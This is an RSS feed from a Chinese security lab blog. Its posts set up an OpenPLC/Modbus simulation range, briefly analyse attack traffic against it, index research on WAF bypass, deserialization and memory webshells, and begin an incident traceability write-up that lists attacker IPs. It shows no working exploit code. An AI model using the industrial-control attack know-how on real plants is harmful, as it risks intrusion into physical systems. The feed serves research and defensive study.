<?xml version="1.0" encoding="UTF-8"?>
<?xml-stylesheet type="text/css" href="/assets/css/rss.css" ?>
<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
  <channel>
    <title>©「哨兵」| Sentry Security</title>
    <description>哨兵安全实验室</description>
    <link>https://www.sentrylab.cn/</link>
    <atom:link href="https://sentrylab.cn/feed.xml" rel="self" type="application/rss+xml" />
    <pubDate>Tue, 18 May 2021 10:57:32 +0800</pubDate>
    <lastBuildDate>Tue, 18 May 2021 10:57:32 +0800</lastBuildDate>
    <generator>Jekyll v3.9.0</generator>
    
      <item>
        <title>blog: 《基于Modbus协议与KingView实现Openplc仿真通讯（2）- 靶场攻击流量分析》</title>
        <description>&lt;h4 id=&quot;-wireshark流量分析&quot;&gt;# &lt;em&gt;WireShark&lt;/em&gt;流量分析&lt;/h4&gt;

&lt;p&gt;网上已经有大佬上传wireshark流量文件，就不重复造轮子去流量了，直接下载下来对照poc代码分析看看：&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;&lt;a href=&quot;https://github.com/sxd0216/attack-packets&quot;&gt;点击下载：&lt;em&gt;sxd0216/attack-packets&lt;/em&gt;&lt;/a&gt;
    &lt;ul&gt;
      &lt;li&gt;14、16帧为client向server请求流量，具体如下图：&lt;/li&gt;
      &lt;li&gt;15、17帧为server返回给client确认流量，具体流量可自行下载分析&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/2021/wireshark_tcp_show.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;h4 id=&quot;-模拟攻击启停&quot;&gt;# 模拟攻击启停&lt;/h4&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/2021/OpenPLC_attack_success.gif&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

</description>
        <pubDate>Fri, 07 May 2021 00:00:00 +0800</pubDate>
        <link> https://www.sentrylab.cn/blog/2021/Realization-of-Openplc-simulation-communication-based-on-Modbus-protocol-and-KingView-II/</link>
        <guid isPermaLink="true">/blog/2021/Realization-of-Openplc-simulation-communication-based-on-Modbus-protocol-and-KingView-II/</guid>
        
        
        <category>blog</category>
        
        <category>漏洞复现</category>
        
        <category>笔记</category>
        
      </item>
    
      <item>
        <title>blog: 《基于Modbus协议与KingView实现Openplc仿真通讯（1）- 仿真通讯靶场搭建》</title>
        <description>&lt;ul&gt;
  &lt;li&gt;基于Modbus协议与KingView实现Openplc仿真通讯 - 通讯靶场网络示意图如下&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/2021//assets-network-show.png&quot; alt=&quot;assets-network-show.png&quot; /&gt;&lt;/p&gt;

&lt;h4 id=&quot;-openplc-on-linux&quot;&gt;# &lt;em&gt;OpenPLC on Linux&lt;/em&gt;&lt;/h4&gt;

&lt;ul&gt;
  &lt;li&gt;&lt;em&gt;OpenPLC&lt;/em&gt;环境搭建
    &lt;ul&gt;
      &lt;li&gt;&lt;a href=&quot;https://github.com/thiagoralves/OpenPLC_v3&quot;&gt;&lt;em&gt;点击以了解OpenPLC&lt;/em&gt;&lt;/a&gt;&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
&lt;/ul&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;$ mkdir ICWR &amp;amp;&amp;amp; cd ICWR
$ git clone https://github.com/thiagoralves/OpenPLC_v3.git
$ cd OpenPLC_v3
$ ./install.sh linux
···
···
···
Compiling for Linux
Generating object files...
Generating glueVars...
Compiling main program...
Compilation finished successfully!
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;运行：&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;nohup ./start_openplc.sh &amp;amp;&lt;/code&gt;&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;&lt;em&gt;OpenPLC_Editor on Linux&lt;/em&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;&lt;strong&gt;作用为本地PLC程序调试使用，无需求可跳过&lt;/strong&gt;&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;$ git clone https://github.com/thiagoralves/OpenPLC_Editor.git
$ cd OpenPLC_Editor
$ ./install.sh
$ ./openplc_editor.sh
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;h4 id=&quot;-openplc-programs&quot;&gt;# &lt;em&gt;OpenPLC Programs&lt;/em&gt;&lt;/h4&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;$ curl -o openplc_test.st https://raw.githubusercontent.com/sxd0216/openplc_test.st/master/openplc_test.st
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/2021/OpenPLC_TODO1.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;h4 id=&quot;-kingview-on-windows&quot;&gt;# &lt;em&gt;Kingview on Windows&lt;/em&gt;&lt;/h4&gt;

&lt;ul&gt;
  &lt;li&gt;设备驱动 -&amp;gt; PLC -&amp;gt; 莫迪康 -&amp;gt; ModBUS TCP -&amp;gt; TCP -&amp;gt; 下一步：&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/2021/KingView_OPENPLC_TODO.png&quot; alt=&quot;KingView_OPENPLC_TODO&quot; /&gt;&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;
    &lt;p&gt;文件 -&amp;gt; 画面 添加组件（可参考动图添加组件）&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;数据库 -&amp;gt; 数据字典 -&amp;gt; 新建…&lt;/p&gt;
    &lt;ul&gt;
      &lt;li&gt;&lt;img src=&quot;/assets/img/blog/2021/KingView_OPENPLC_TODO2.png&quot; alt=&quot;&quot; /&gt;&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;选中自定义画面 -&amp;gt; make -&amp;gt; view （GIF动画有点大，loading…）：&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/2021/KingView_OPENPLC_success.gif&quot; alt=&quot;success.gif&quot; /&gt;&lt;/p&gt;
</description>
        <pubDate>Fri, 07 May 2021 00:00:00 +0800</pubDate>
        <link> https://www.sentrylab.cn/blog/2021/Realization-of-Openplc-simulation-communication-based-on-Modbus-protocol-and-KingView-I/</link>
        <guid isPermaLink="true">/blog/2021/Realization-of-Openplc-simulation-communication-based-on-Modbus-protocol-and-KingView-I/</guid>
        
        
        <category>blog</category>
        
        <category>漏洞复现</category>
        
        <category>笔记</category>
        
      </item>
    
      <item>
        <title>event: 置顶文章速览 - 更新于2021/05/15</title>
        <description> &lt;p&gt; Location: 安庆·安徽 &lt;/p&gt; &lt;hr /&gt;

&lt;details&gt;
&lt;summary&gt;&lt;h3&gt;&lt;a&gt;&lt;i class=&quot;fa fa-hand-o-right&quot;&gt;&lt;/i&gt;&lt;/a&gt; 点击以展开置顶文章速览导航树&lt;/h3&gt;&lt;/summary&gt;
&lt;ul&gt;
  &lt;li&gt;「哨兵安全」：markdown用法一览，手打wiki以便使用SentryLab「markdown」
    &lt;ul&gt;
      &lt;li&gt;放置于公告窗口置顶下：&lt;a href=&quot;https://about.sentrylab.cn/news/sentry-lab-markdown-usage/&quot;&gt;SentryLab「markdown」语法介绍&amp;amp;批注&lt;/a&gt;&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
  &lt;li&gt;2021/02/04：已更新「我的研究」栏目文章：
    &lt;ul&gt;
      &lt;li&gt;1、&lt;a href=&quot;https://about.sentrylab.cn/help/Mod-Waf-Bypass-Walkthrough/&quot;&gt;分享：ModsecWAF：老牌开源waf的绕过历程&lt;/a&gt;&lt;/li&gt;
      &lt;li&gt;2、&lt;a href=&quot;https://about.sentrylab.cn/help/ShiroDeser/&quot;&gt;分享：Different Shiro Framework deserialization analysis ideas&lt;/a&gt; （重构文章框架）&lt;/li&gt;
      &lt;li&gt;3、&lt;a href=&quot;https://about.sentrylab.cn/help/SpringBoot-Memory-files-heapdump-Analysis/&quot;&gt;思路：heapdump文件分析历程&lt;/a&gt;&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
  &lt;li&gt;2021/02/09 已更新：
    &lt;ul&gt;
      &lt;li&gt;1、修改于&lt;a href=&quot;/feed.xml&quot;&gt;订阅&lt;/a&gt;的不匹配问题；&lt;/li&gt;
      &lt;li&gt;2、导航栏处添加&lt;a href=&quot;http://wiki.sentrylab.cn&quot;&gt;WIKI&lt;/a&gt;栏目，供参考。&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
  &lt;li&gt;2021/03/10 已更新：
    &lt;ul&gt;
      &lt;li&gt;1、&lt;a href=&quot;https://about.sentrylab.cn/help/Research-on-Webshell-Attack-of-Shiro-Framework-Based-on-Memory/&quot;&gt;基于内存的Shiro框架Webshell攻击研究&lt;/a&gt;&lt;/li&gt;
      &lt;li&gt;2、&lt;a href=&quot;https://about.sentrylab.cn/help/ALL-mvn-build-errors/&quot;&gt;安全与开发之：&lt;em&gt;Maven&lt;/em&gt;构建排错&lt;/a&gt;&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
  &lt;li&gt;2021/04/15 已更新：
    &lt;ul&gt;
      &lt;li&gt;1、&lt;a href=&quot;https://www.sentrylab.cn/blog/2021/Record-a-suffocating-emergency-response-and-traceability-incident/&quot;&gt;《Bin4xin：我的网安从业朔源事件记录》&lt;/a&gt;&lt;/li&gt;
      &lt;li&gt;2、&lt;a href=&quot;https://www.sentrylab.cn/blog/2021/yonyou-nc6.5-java-underser/&quot;&gt;[UPDATING…]用友NC6.5java反序列化&lt;/a&gt;&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
  &lt;li&gt;2021/05/07 已更新：
    &lt;ul&gt;
      &lt;li&gt;1、&lt;a href=&quot;https://www.sentrylab.cn/blog/2021/Realization-of-Openplc-simulation-communication-based-on-Modbus-protocol-and-KingView-I/&quot;&gt;《基于Modbus协议与KingView实现Openplc仿真通讯（1）- 仿真通讯靶场搭建》&lt;/a&gt;&lt;/li&gt;
      &lt;li&gt;2、&lt;a href=&quot;https://www.sentrylab.cn/blog/2021/Realization-of-Openplc-simulation-communication-based-on-Modbus-protocol-and-KingView-II/&quot;&gt;《基于Modbus协议与KingView实现Openplc仿真通讯（2）- 靶场攻击流量分析》&lt;/a&gt;&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
  &lt;li&gt;2021/05/14 已更新：
    &lt;ul&gt;
      &lt;li&gt;1、&lt;a href=&quot;https://github.com/Bin4xin/B4xinSynchronize&quot;&gt;&lt;em&gt;B4xinSynchronize&lt;/em&gt;&lt;/a&gt;
        &lt;ul&gt;
          &lt;li&gt;&lt;a href=&quot;https://github.com/Bin4xin/B4xinSynchronize#%E4%BB%80%E4%B9%88%E6%98%AFb4xinsynchronize&quot;&gt;点击以查看 &lt;em&gt;B4xinSynchronize&lt;/em&gt; 项目介绍和开发日志&lt;/a&gt;&lt;/li&gt;
          &lt;li&gt;2021年 5月 7日 星期五 13时46分03秒 CST ：
            &lt;ul class=&quot;task-list&quot;&gt;
              &lt;li class=&quot;task-list-item&quot;&gt;&lt;input type=&quot;checkbox&quot; class=&quot;task-list-item-checkbox&quot; disabled=&quot;disabled&quot; checked=&quot;checked&quot; /&gt;bash脚本版本完成
                &lt;ul&gt;
                  &lt;li&gt;&lt;a href=&quot;https://github.com/Bin4xin/B4xinSynchronize/blob/master/draw_table.sh&quot;&gt;表格美化&lt;em&gt;by banemon&lt;/em&gt;&lt;/a&gt;✅&lt;/li&gt;
                  &lt;li&gt;动画加载✅&lt;/li&gt;
                &lt;/ul&gt;
              &lt;/li&gt;
              &lt;li class=&quot;task-list-item&quot;&gt;&lt;input type=&quot;checkbox&quot; class=&quot;task-list-item-checkbox&quot; disabled=&quot;disabled&quot; /&gt;python相关代码编写中…&lt;/li&gt;
              &lt;li class=&quot;task-list-item&quot;&gt;&lt;input type=&quot;checkbox&quot; class=&quot;task-list-item-checkbox&quot; disabled=&quot;disabled&quot; /&gt;C++相关代码编写中…&lt;/li&gt;
            &lt;/ul&gt;
          &lt;/li&gt;
          &lt;li&gt;2021年 5月10日 星期一 10时01分01秒 CST ：
            &lt;ul&gt;
              &lt;li&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;_inculde/footer.html&lt;/code&gt;新增访客统计；&lt;/li&gt;
            &lt;/ul&gt;
          &lt;/li&gt;
        &lt;/ul&gt;
      &lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
&lt;/ul&gt;
&lt;/details&gt;

&lt;!--

- 「哨兵安全」：markdown用法一览，手打wiki以便使用SentryLab「markdown」
    - 放置于公告窗口置顶下：[SentryLab「markdown」语法介绍&amp;批注](https://about.sentrylab.cn/news/sentry-lab-markdown-usage/)
- 2021/02/04：已更新「我的研究」栏目文章：
    - 1、[分享：ModsecWAF：老牌开源waf的绕过历程](https://about.sentrylab.cn/help/Mod-Waf-Bypass-Walkthrough/)
    - 2、[分享：Different Shiro Framework deserialization analysis ideas](https://about.sentrylab.cn/help/ShiroDeser/) （重构文章框架）
    - 3、[思路：heapdump文件分析历程](https://about.sentrylab.cn/help/SpringBoot-Memory-files-heapdump-Analysis/)


- 2021/02/09 已更新：
    - 1、修改于[订阅](/feed.xml)的不匹配问题；
    - 2、导航栏处添加[WIKI](http://wiki.sentrylab.cn)栏目，供参考。



- 2021/03/10 已更新：
    - 1、[基于内存的Shiro框架Webshell攻击研究](https://about.sentrylab.cn/help/Research-on-Webshell-Attack-of-Shiro-Framework-Based-on-Memory/)
    - 2、[安全与开发之：*Maven*构建排错](https://about.sentrylab.cn/help/ALL-mvn-build-errors/)


- 2021/04/15 已更新：
    - 1、[《Bin4xin：我的网安从业朔源事件记录》](https://www.sentrylab.cn/blog/2021/Record-a-suffocating-emergency-response-and-traceability-incident/)
    - 2、[[UPDATING...]用友NC6.5java反序列化](https://www.sentrylab.cn/blog/2021/yonyou-nc6.5-java-underser/)
     

- 2021/05/07 已更新：
    - 1、[《基于Modbus协议与KingView实现Openplc仿真通讯（1）- 仿真通讯靶场搭建》](https://www.sentrylab.cn/blog/2021/Realization-of-Openplc-simulation-communication-based-on-Modbus-protocol-and-KingView-I/)    
    - 2、[《基于Modbus协议与KingView实现Openplc仿真通讯（2）- 靶场攻击流量分析》](https://www.sentrylab.cn/blog/2021/Realization-of-Openplc-simulation-communication-based-on-Modbus-protocol-and-KingView-II/)


- 2021/05/14 已更新：
    - 1、[*B4xinSynchronize*](https://github.com/Bin4xin/B4xinSynchronize) 
        - [点击以查看 *B4xinSynchronize* 项目介绍和开发日志](https://github.com/Bin4xin/B4xinSynchronize#%E4%BB%80%E4%B9%88%E6%98%AFb4xinsynchronize)
        - 2021年 5月 7日 星期五 13时46分03秒 CST ：
            - [x] bash脚本版本完成
              - [表格美化*by banemon*](https://github.com/Bin4xin/B4xinSynchronize/blob/master/draw_table.sh)✅
              - 动画加载✅
            - [ ] python相关代码编写中...
            - [ ] C++相关代码编写中...
        - 2021年 5月10日 星期一 10时01分01秒 CST ：
            - `_inculde/footer.html`新增访客统计；

--&gt;

&lt;h3 id=&quot;-新增表格展示&quot;&gt;&lt;a&gt;&lt;i class=&quot;fa fa-hand-o-right&quot;&gt;&lt;/i&gt;&lt;/a&gt; 新增表格展示&lt;/h3&gt;

&lt;table class=&quot;table&quot;&gt;
  &lt;thead&gt;
    &lt;tr&gt;
      &lt;th&gt;更新时间&lt;/th&gt;
      &lt;th&gt;操作&lt;/th&gt;
      &lt;th&gt;书签&lt;/th&gt;
    &lt;/tr&gt;
  &lt;/thead&gt;
  &lt;tbody&gt;
    &lt;tr&gt;
      &lt;td&gt;2021/02/04&lt;/td&gt;
      &lt;td&gt;更新于公告窗口置顶&lt;/td&gt;
      &lt;td&gt;&lt;a href=&quot;https://about.sentrylab.cn/news/sentry-lab-markdown-usage/&quot;&gt;SentryLab「markdown」语法介绍&amp;amp;批注&lt;/a&gt;&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt; &lt;/td&gt;
      &lt;td&gt;新增[我的研究]文章&lt;/td&gt;
      &lt;td&gt;&lt;a href=&quot;https://about.sentrylab.cn/help/Mod-Waf-Bypass-Walkthrough/&quot;&gt;分享：ModsecWAF：老牌开源waf的绕过历程&lt;/a&gt;&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt; &lt;/td&gt;
      &lt;td&gt;重构[我的研究]框架&lt;/td&gt;
      &lt;td&gt;&lt;a href=&quot;https://about.sentrylab.cn/help/ShiroDeser/&quot;&gt;分享：Different Shiro Framework deserialization analysis ideas&lt;/a&gt;&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt; &lt;/td&gt;
      &lt;td&gt;新增[我的研究]文章&lt;/td&gt;
      &lt;td&gt;&lt;a href=&quot;https://about.sentrylab.cn/help/SpringBoot-Memory-files-heapdump-Analysis/&quot;&gt;思路：heapdump文件分析历程&lt;/a&gt;&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;2021/02/09&lt;/td&gt;
      &lt;td&gt;修复显示错误&lt;/td&gt;
      &lt;td&gt;修改于&lt;a href=&quot;/feed.xml&quot;&gt;订阅&lt;/a&gt;的&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;post.url&lt;/code&gt;不匹配问题；&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt; &lt;/td&gt;
      &lt;td&gt;添加导航栏&lt;/td&gt;
      &lt;td&gt;添加&lt;a href=&quot;http://wiki.sentrylab.cn&quot;&gt;WIKI&lt;/a&gt;栏目&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;2021/03/10&lt;/td&gt;
      &lt;td&gt;新增「博客」文章&lt;/td&gt;
      &lt;td&gt;&lt;a href=&quot;https://about.sentrylab.cn/help/Research-on-Webshell-Attack-of-Shiro-Framework-Based-on-Memory/&quot;&gt;基于内存的Shiro框架Webshell攻击研究&lt;/a&gt;&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt; &lt;/td&gt;
      &lt;td&gt;新增「博客」文章&lt;/td&gt;
      &lt;td&gt;&lt;a href=&quot;https://about.sentrylab.cn/help/ALL-mvn-build-errors/&quot;&gt;安全与开发之：&lt;em&gt;Maven&lt;/em&gt;构建排错&lt;/a&gt;&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;2021/04/15&lt;/td&gt;
      &lt;td&gt;新增「博客」文章&lt;/td&gt;
      &lt;td&gt;&lt;a href=&quot;https://www.sentrylab.cn/blog/2021/Record-a-suffocating-emergency-response-and-traceability-incident/&quot;&gt;《Bin4xin：我的网安从业朔源事件记录》&lt;/a&gt;&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt; &lt;/td&gt;
      &lt;td&gt;新增「博客」文章&lt;/td&gt;
      &lt;td&gt;&lt;a href=&quot;https://www.sentrylab.cn/blog/2021/yonyou-nc6.5-java-underser/&quot;&gt;[UPDATING…]用友NC6.5java反序列化&lt;/a&gt;&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;2021/05/07&lt;/td&gt;
      &lt;td&gt;新增「博客」文章&lt;/td&gt;
      &lt;td&gt;&lt;a href=&quot;https://www.sentrylab.cn/blog/2021/Realization-of-Openplc-simulation-communication-based-on-Modbus-protocol-and-KingView-I/&quot;&gt;《基于Modbus协议与KingView实现Openplc仿真通讯（1）- 仿真通讯靶场搭建》&lt;/a&gt;&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt; &lt;/td&gt;
      &lt;td&gt;新增「博客」文章&lt;/td&gt;
      &lt;td&gt;&lt;a href=&quot;https://www.sentrylab.cn/blog/2021/Realization-of-Openplc-simulation-communication-based-on-Modbus-protocol-and-KingView-II/&quot;&gt;《基于Modbus协议与KingView实现Openplc仿真通讯（2）- 靶场攻击流量分析》&lt;/a&gt;&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;2021/05/14&lt;/td&gt;
      &lt;td&gt;个人&lt;a href=&quot;https://github.com/Bin4xin/&quot;&gt;&lt;i class=&quot;fa fa-github&quot;&gt;&lt;/i&gt; GitHub &lt;/a&gt;项目&lt;/td&gt;
      &lt;td&gt;&lt;a href=&quot;https://github.com/Bin4xin/B4xinSynchronize&quot;&gt;&lt;em&gt;B4xinSynchronize&lt;/em&gt;&lt;/a&gt;&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt; &lt;/td&gt;
      &lt;td&gt;2021/05/07/星期五&lt;/td&gt;
      &lt;td&gt;bash脚本版本完成&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt; &lt;/td&gt;
      &lt;td&gt; &lt;/td&gt;
      &lt;td&gt;C++相关代码编写中…&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt; &lt;/td&gt;
      &lt;td&gt; &lt;/td&gt;
      &lt;td&gt;Python相关代码编写中…&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt; &lt;/td&gt;
      &lt;td&gt;2021/05/10/星期一&lt;/td&gt;
      &lt;td&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;_inculde/footer.html&lt;/code&gt;新增访客统计&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt; &lt;/td&gt;
      &lt;td&gt; &lt;/td&gt;
      &lt;td&gt; &lt;/td&gt;
    &lt;/tr&gt;
  &lt;/tbody&gt;
&lt;/table&gt;
</description>
        <pubDate>Wed, 05 May 2021 00:00:00 +0800</pubDate>
        <link> https://www.sentrylab.cn/event/2021/sentry-lab-markdown-usage/</link>
        <guid isPermaLink="true">/event/2021/sentry-lab-markdown-usage/</guid>
        
        <category>笔记</category>
        
        <category>wiki</category>
        
        
        <category>event</category>
        
      </item>
    
      <item>
        <title>blog: [UPDATING...]用友NC6.5java反序列化</title>
        <description>&lt;h2 id=&quot;零用友nc65反序列化依赖jar包&quot;&gt;零：用友nc6.5反序列化依赖jar包&lt;/h2&gt;

&lt;ul&gt;
  &lt;li&gt;部分依赖jar包在安装完nc6.5系统后，一般在&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;C://yonyou//home//lib//&lt;/code&gt;目录下，前提需要有nc6.5的安装包；或者下载仓库内的依赖包：
    &lt;ul&gt;
      &lt;li&gt;&lt;em&gt;&lt;a href=&quot;https://github.com/Bin4xin/bigger-than-bigger/blob/master/yonyou-nc6.5-lib/README.MD&quot;&gt;点击以了解yonyou-nc6.5-lib&lt;/a&gt;&lt;/em&gt;
        &lt;ul&gt;
          &lt;li&gt;本机运行环境&lt;/li&gt;
        &lt;/ul&gt;

        &lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;  java version &quot;1.8.0_181&quot;
  Java(TM) SE Runtime Environment (build 1.8.0_181-b13)
  Java HotSpot(TM) 64-Bit Server VM (build 25.181-b13, mixed mode)

  javac 1.8.0_181
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;        &lt;/div&gt;
      &lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
  &lt;li&gt;学习教程&lt;a href=&quot;https://github.com/Bin4xin/bigger-than-bigger/blob/master/yonyou-nc6.5-lib/README.MD&quot;&gt;&lt;em&gt;README&lt;/em&gt;&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;h3 id=&quot;0x01下载&quot;&gt;0x01：下载&lt;/h3&gt;

&lt;ul&gt;
  &lt;li&gt;单jar包：点击&lt;a href=&quot;https://github.com/Bin4xin/bigger-than-bigger/blob/master/yonyou-nc6.5-lib/ncdepend.jar&quot;&gt;&lt;em&gt;ncdepend.jar&lt;/em&gt;&lt;/a&gt;链接 -&amp;gt; Download.&lt;/li&gt;
  &lt;li&gt;整包&lt;a href=&quot;https://github.com/Bin4xin/bigger-than-bigger/releases/tag/yonyou-ncv6.5&quot;&gt;&lt;em&gt;yonyou-NCv6.5-lib.zip&lt;/em&gt;&lt;/a&gt;链接 -&amp;gt; 单击链接下载&lt;/li&gt;
&lt;/ul&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;[anonymous] DEBUG  - Invoke nc.bs.framework.server.RemoteMetaContext.lookup write info to server spend time: 188 
Exception in thread &quot;main&quot; nc.bs.framework.exception.FrameworkIOException: Remote request error
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

</description>
        <pubDate>Sat, 13 Mar 2021 00:00:00 +0800</pubDate>
        <link> https://www.sentrylab.cn/blog/2021/yonyou-nc6.5-java-underser/</link>
        <guid isPermaLink="true">/blog/2021/yonyou-nc6.5-java-underser/</guid>
        
        
        <category>blog</category>
        
        <category>笔记</category>
        
      </item>
    
      <item>
        <title>blog: CST 2021年 4月14日 星期三：一次朔源事件的记录</title>
        <description>&lt;h3&gt;&lt;em&gt;《Bin4xin：我的网安从业朔源事件记录》&lt;/em&gt;&lt;/h3&gt;

&lt;h3 id=&quot;零起源&quot;&gt;零：起源&lt;/h3&gt;

&lt;ul&gt;
  &lt;li&gt;
    &lt;p&gt;&lt;em&gt;一日，某护网红队支撑群里发了一份朔源报告，鸦雀无声&lt;/em&gt;&lt;/p&gt;

    &lt;ul&gt;
      &lt;li&gt;
        &lt;p&gt;甲方：小伙伴们接集团要求需对 &lt;em&gt;WAF全流量平台&lt;/em&gt; 攻击ip进行朔源…&lt;/p&gt;

        &lt;ul&gt;
          &lt;li&gt;废佬：这…（甲方你真可爱）&lt;/li&gt;
        &lt;/ul&gt;
      &lt;/li&gt;
      &lt;li&gt;
        &lt;p&gt;领导1：溯源到攻击端信息是个新的领域，望小伙伴们通过此次集团安排做些尝试性学习和探索，
  落实外部可借力工具和资源，&lt;a href=&quot;https://www.github.com/Bin4xin&quot; target=&quot;_blank&quot;&gt;[@Bin4xin废佬]&lt;/a&gt;也加入此次探索学习中。&lt;/p&gt;

        &lt;ul&gt;
          &lt;li&gt;废佬：这…（领导你真可爱）&lt;/li&gt;
        &lt;/ul&gt;
      &lt;/li&gt;
      &lt;li&gt;
        &lt;p&gt;领导2：&lt;em&gt;文件：《全流量、WAF4月8日-4月12日攻击IP(1).xlsx》&lt;/em&gt;&lt;/p&gt;
        &lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;$ more 全流量、WAF4月8日-4月12日攻击IP\(1\).csv    
223.214.211.46
36.59.38.115
        
$ more 全流量、WAF4月8日-4月12日攻击IP\(1\).csv|wc -l
16570
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;        &lt;/div&gt;
        &lt;ul&gt;
          &lt;li&gt;废佬：这…（领导你真可爱）&lt;/li&gt;
        &lt;/ul&gt;
      &lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;于是废佬就开始了愉快 &lt;em&gt;boring&lt;/em&gt; 的朔源之旅&lt;/p&gt;
  &lt;/li&gt;
&lt;/ul&gt;

&lt;h3 id=&quot;一上午欢乐时光--fofa安全工程师&quot;&gt;一：上午、欢乐时光 &amp;amp; fofa安全工程师&lt;/h3&gt;

&lt;blockquote&gt;
  &lt;p&gt;鲁迅：&lt;/p&gt;

  &lt;p&gt;不会朔源的fofa安全工程师不是一个好的信息安全工程师&lt;/p&gt;
&lt;/blockquote&gt;

&lt;h4 id=&quot;-1x01awksplit--linux&quot;&gt;# 1x01：awk、split &amp;amp; linux&lt;/h4&gt;

&lt;ul&gt;
  &lt;li&gt;步入主题之前，先对这些文件进行一些简单的操作：
    &lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;  $ split -l 300 全流量、WAF4月8日-4月12日攻击IP\(1\).csv ips_preview_by300_
  $ cat ips_preview_by300_aa|wc -l                     
     300
  $ ll
    total 1400
    drwxr-xr-x  59 bin4xin  staff    1888  4 14 20:48 ./
    drwxr-xr-x+ 43 bin4xin  staff    1376  4 14 20:45 ../
    -rw-r--r--   1 bin4xin  staff    4548  4 14 20:48 ips_preview_by300_aa
    -rw-r--r--   1 bin4xin  staff    4457  4 14 20:48 ips_preview_by300_ab
    -rw-r--r--   1 bin4xin  staff    4481  4 14 20:48 ips_preview_by300_ac
    ··· 
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;    &lt;/div&gt;
